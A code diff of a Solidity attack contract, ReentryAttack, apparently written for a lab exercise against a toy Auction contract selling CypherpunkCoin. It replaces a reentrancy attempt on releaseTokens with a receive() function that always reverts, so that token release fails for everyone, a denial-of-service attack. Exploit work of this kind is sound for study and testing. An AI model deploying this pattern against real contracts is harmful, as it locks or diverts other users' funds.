@@ -3,6 +3,9 @@ pragma solidity ^0.6.0;
 import "./Auction.sol";
 import "./CypherpunkCoin.sol";
 
+// auction.startPrice() * 10**12 * auction.tokenSupply()
+// address(auction).delegatecall(abi.encodeWithSignature("commit()"));
+
 // the trick is try to become the last bidder and exploit releaseTokens as
 // it transfer ether to an external agent
 
@@ -16,36 +19,21 @@ import "./CypherpunkCoin.sol";
 // call release tokens again and generate errors
 // therefore, no one can claim the tokens because of this attack
 contract ReentryAttack {
-    Auction public auction;
-    CypherpunkCoin public token;
-    address payable owner;
+    Auction auction;
+    address owner;
 
-    // we should send the money to the contract before doing the test
-    constructor(address auctionAddress, address payable tokenAddress) public {
+    constructor(address auctionAddress) public {
         auction = Auction(auctionAddress);
-        token = CypherpunkCoin(tokenAddress);
         owner = msg.sender;
     }
 
-    // contract commits to the auction
-    function commit() public payable {
-        auction.commit.value(
-            // auction.startPrice() * 10**12 * auction.tokenSupply()
-            1000000000000000000
-        )();
+    function commit() external payable {
+        require(msg.sender == owner);
+        auction.commit.value(msg.value)();
     }
 
-    function withdrawTokens() public {
-        auction.releaseTokens();
-    }
-
-    function withdraw() external {
-        owner.transfer(address(this).balance);
-    }
-
-    // fallback function
     receive() external payable {
-        auction.releaseTokens();
+        revert("You are hacked, haha");
     }
 }
 
